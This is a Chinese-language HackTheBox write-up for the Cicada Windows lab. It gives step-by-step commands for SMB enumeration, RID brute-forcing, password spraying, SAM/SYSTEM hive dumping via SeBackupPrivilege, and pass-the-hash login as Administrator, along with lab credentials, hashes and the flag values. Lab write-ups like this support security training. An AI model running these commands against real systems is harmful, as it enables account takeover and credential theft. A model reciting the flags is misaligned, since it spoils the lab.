---
title: "HackTheBox wp - Cicada"
date: 2024-10-17 11:10:00 +0800
categories: [HackTheBox, Machines]
tags: [Windows, 靶场, Easy]

---

# 概述
1. 端口扫描
2. Guest账户访问smb服务, 对 `IPC$` 和 `HR` 文件共享有读权限
    1. `IPC$` 可读, 使用 RID 爆破得到用户名
    2. `HR` 文件共享里面找到密码
    3. 密码喷洒, 得到账户A
3. 账户A `enum4linux`, 得到账户B
4. 账户B读 `DEV` 共享, 得到账户C
5. 账户C `winrm` 登录, 得到 `user flag`
6. `whoami /priv` 有 `SeBackupPrivilege` 权限, 拖SAM文件
7. 拿到 Administrator 账户的 hash, PTH登录winrm, 得到 `root flag`


# 细节 
端口扫描与服务识别
```bash
$ docker run -it --rm --name rustscan rustscan/rustscan:2.1.1 -u 70000 -b 65535 -a 10.10.11.35 -- -Pn -sC -sV -T4
```

得到以下开放端口和端口信息
```text
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain?       syn-ack
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-10-17 14:08:40Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
65431/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

发现445端口开放，尝试用Guest账户查看文件共享
```bash
$ impacket-smbclient Guest@10.10.11.35 -no-pass
```

![Desktop View](/assets/img/posts/2024-10-17-HTB-Machines-Cicada-images-0.jpg)


从中，得到一个密码
```
Your default password is: Cicada$M6Corpb*@Lp#nZp!8
```

使用Guest账户枚举可用的账户名

```bash
$ crackmapexec smb 10.10.11.35 -u "Guest" -p "" --rid-brute | grep "SidTypeUser"
```

得到以下结果
```text
SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

创建一个 `users.txt` 然后将收集到的用户名放入其中，然后进行密码喷洒。

```bash
$ crackmapexec smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![Desktop View](/assets/img/posts/2024-10-17-HTB-Machines-Cicada-images-1.jpg)


得到有效账户密码
```text
username: michael.wrightson
password: Cicada$M6Corpb*@Lp#nZp!8
```

使用 enum4linux 枚举信息
```bash
$ enum4linux -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35
```

找到一个新的账号密码

![Desktop View](/assets/img/posts/2024-10-17-HTB-Machines-Cicada-images-2.jpg)

```text
username: david.orelious
password: aRt$Lp#7t*VQ!3
```

使用这个新找到的账户密码继续smb枚举，发现可以读取 dev 目录，如下图

```bash
$ crackmapexec smb 10.10.11.35 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

![Desktop View](/assets/img/posts/2024-10-17-HTB-Machines-Cicada-images-3.jpg)

在 dev 目录下，找到一个新的账号密码，如下图

![Desktop View](/assets/img/posts/2024-10-17-HTB-Machines-Cicada-images-4.png)

```text
username: emily.oscars
password: Q!3@Lp#M6b*7t*Vt
```

使用这个新找到的账户密码继续枚举

```bash
$ crackmapexec smb 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'

$ crackmapexec winrm 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

![Desktop View](/assets/img/posts/2024-10-17-HTB-Machines-Cicada-images-5.jpg)

发现可以winrm登录，然后使用 `evil-winrm` 登录，拿到 user 的 flag

```bash
$ evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i 10.10.11.35
```

![Desktop View](/assets/img/posts/2024-10-17-HTB-Machines-Cicada-images-6.jpg)

```text
flag user: 85fd6ae588e821f0ef54a8313dc9c41f
```

然后信息收集，查看自己的权限
```bash
$ whoami /priv

# SeBackupPrivilege             Back up files and directories  Enabled
```

发现自己有 `SeBackupPrivilege` 权限，直接 dump sam 文件，然后用 `impacket-secretsdump` 还原出用户 hash
```bash
$ reg save hklm\sam sam.save
$ reg save hklm\system system.sava
$ impacket-secretsdump -sam sam.save -system system.sava LOCAL
```

![Desktop View](/assets/img/posts/2024-10-17-HTB-Machines-Cicada-images-7.jpg)

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

使用Administrator账户的hash，PTH登录winrm，然后拿到root flag

```bash
$ evil-winrm -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341' -i 10.10.11.35
```

![Desktop View](/assets/img/posts/2024-10-17-HTB-Machines-Cicada-images-8.jpg)

```text
flag root: dbb6fe8ff9d3167274e2d240879c9163
```
